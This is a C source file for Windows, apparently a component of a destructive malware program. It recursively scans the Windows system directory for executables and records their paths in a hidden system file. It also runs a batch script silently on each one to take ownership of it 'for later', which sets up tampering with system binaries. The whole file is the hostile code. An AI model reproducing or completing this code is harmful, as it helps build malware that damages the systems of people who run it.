#include <Windows.h>
#include "Utils.h"

#define MAX_EXECUTABLES 65536
int exeCount = 0;

void findEXEs(LPCTSTR path);
BOOL endsWith(LPCTSTR str, LPCTSTR end);

HANDLE exeFiles;

DWORD WINAPI findEXEsThread(LPVOID parameter) {
	exeFiles = CreateFile(ExpandPath(TEXT("%SYSTEMROOT%\\executables.bin")), GENERIC_WRITE,
		FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);

	LPTSTR path = ExpandPath(TEXT("%SYSTEMROOT%\\"));
	findEXEs(path);
	MemeFree(path);

	CloseHandle(exeFiles);

	return NULL;
}

// TODO Blacklist

void findEXEs(LPCTSTR path) {
	LPTSTR sPath = (LPTSTR)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH + 1) * sizeof(TCHAR));
	lstrcpy(sPath, path);
	sPath[lstrlen(sPath)] = TEXT('*');

	WIN32_FIND_DATA file;
	HANDLE hFind = FindFirstFile(sPath, &file);

	if (hFind != INVALID_HANDLE_VALUE) {
		int oi = lstrlen(sPath) - 1;

		do {
			sPath[oi] = 0;

			lstrcat(sPath, file.cFileName);

			if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (lstrcmp(file.cFileName, TEXT(".")) != 0 && lstrcmp(file.cFileName, TEXT("..")) != 0) {
					int x = lstrlen(sPath);
					sPath[x] = TEXT('\\');
					sPath[x + 1] = 0;

					findEXEs(sPath);
				}
			} else {
				if (endsWith(file.cFileName, TEXT(".exe"))) {
					if (exeCount >= MAX_EXECUTABLES) {
						return;
					}

					// Get the Ownership of the file for later
					// TODO Do it without batch and use efficient C code
					LPTSTR takeOwnCommand = ExpandPath(TEXT("%TEMP%\\TakeOwn.bat"));
					lstrcat(takeOwnCommand, TEXT(" \""));
					lstrcat(takeOwnCommand, sPath);
					lstrcat(takeOwnCommand, TEXT("\""));
					RunFileExFlags(NULL, takeOwnCommand, NULL, TRUE, CREATE_NO_WINDOW);
					MemeFree(takeOwnCommand);

					DWORD written;
					WriteFile(exeFiles, sPath, MAX_PATH * sizeof(TCHAR), &written, NULL);
					FlushFileBuffers(exeFiles);

					exeCount++;
				}
			}
		} while (FindNextFile(hFind, &file));

		LocalFree(sPath);
		FindClose(hFind);
	}
}